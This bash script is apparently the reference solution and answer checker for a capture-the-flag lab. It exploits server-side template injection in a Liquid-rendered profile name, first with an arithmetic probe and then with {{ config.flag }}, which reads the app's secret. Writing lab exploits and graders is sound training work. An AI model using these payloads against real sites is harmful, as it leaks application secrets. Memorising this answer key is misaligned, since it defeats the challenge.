#!/usr/bin/env bash
# ============================================================
# LiquidProfile (labs23) — reference solution: server-side
# template injection in profile fields
#
# Chain: self-register -> the change-password page renders the
# stored first/last name through the Liquid engine -> confirm the
# SSTI with an arithmetic payload ({{ 7 | plus: 7 }} -> 14) -> the
# render context exposes internal objects, so {{ config.flag }}
# reads the application secret out of the template scope.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8103)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8103}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\",\"first_name\":\"Ada\",\"last_name\":\"Byron\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

set_name() {
  curl -fsS -o /dev/null -X POST "$BASE/api/profile" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"first_name\":$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$1")}"
}

echo "[*] confirming SSTI: {{ 7 | plus: 7 }} should render as 14" >&2
set_name '{{ 7 | plus: 7 }}'
PAGE="$(curl -fsS "$BASE/change-password" -H "Authorization: Bearer $TOKEN")"
grep -q '<b>14' <<<"$PAGE" && echo "[*] SSTI confirmed (arithmetic evaluated server-side)" >&2 \
  || { echo "[-] failed: arithmetic payload did not evaluate" >&2; exit 1; }

echo "[*] reading the internal config object through the template scope" >&2
set_name '{{ config.flag }}'
PAGE="$(curl -fsS "$BASE/change-password" -H "Authorization: Bearer $TOKEN")"
flag="$(grep -Eo "$FLAG_RE" <<<"$PAGE" | head -n1 || true)"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: config.flag not rendered on the page" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
